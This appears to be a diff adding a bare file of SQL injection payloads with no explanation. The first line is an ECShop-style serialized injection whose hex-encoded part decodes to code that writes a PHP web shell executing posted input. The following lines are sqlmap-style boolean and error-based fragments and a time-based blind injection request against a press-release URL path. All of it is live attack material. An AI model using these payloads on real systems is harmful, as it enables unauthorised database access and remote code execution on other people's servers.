@@ -1,0 +1,7 @@
+554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676b58314250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";}
+
+AND 7885=CONCAT(CHAR(113)+CHAR(107)+CHAR(112)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (7885=7885) THEN CHAR(49) ELSE CHAR(48)
+
+'))) AND (SELECT 7661 FROM(SELECT COUNT(*),CONCAT(0x716b707871,(SELECT (ELT(7661=7661,1))),0x71627a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((('EcMr'='EcMr"
+
+GET /serviceassistent/prod/20171115/prod/2/xml/pressemitteilungen/1,3,4,5,7,8,9,10,11,12,185/cms_oid/alle/cms_web/alle/publicressorts/alle/presse_frei_id/alle/kategorie/alle/limit/10/offset/0/mitbild/bild_in_teaser/bildvariante/th/archiv/alle/anzahltopmeldungen/0/von/start/bis/jetzt/monat/(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'%22+(select(0)from(select(sleep(15)))v)+%22*//jahr/alle/suche/1/am/jetzt/uebernahmeressorts/ohne/uebernahmekategorien/ohne/startseite/alle
